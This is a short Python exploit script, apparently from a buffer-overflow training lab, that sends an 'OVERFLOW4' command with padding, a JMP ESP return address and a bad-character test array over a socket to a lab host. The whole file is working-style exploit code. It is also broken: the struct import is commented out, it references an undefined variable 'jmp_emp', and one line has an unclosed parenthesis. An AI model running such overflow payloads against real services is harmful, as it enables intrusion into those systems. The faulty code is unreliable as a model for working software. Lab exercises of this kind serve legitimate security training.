#!/usr/bin/python3
import socket
#import struct
#import pwn import p32 

def p32(data):
    return struct.pack("<I", data)

host, port = "10.10.61.109", 1337

all_chars = bytearray(range(0,256))

bad_chars = [
        b"\x00", 
        b"\xa9",
        b"\xcd",
        b"\xd5",
        ]


# Add bad char to bad_chars as we discover them
for bad_char in bad_chars:
    all_chars = all_chars.replace(bad_char, b"")

cmd = b"OVERFLOW4 "
pattern_length = 2100 # Documentation and keep for length retention
offset = 2026
new_eip = b"BBBB"
jmp_esp = p32(0x625011AF) # must be the correct endianness


payload = b"".join([
            cmd,
            b"A" * offset,
            jmp_emp, # replaced new_eip
            all_chars,
            b"C" *  (pattern_length - len(new_eip) - offset - len(all_chars),
        ])

with socket.socket() as s:
    s.connect((host,port))
    s.send(payload)

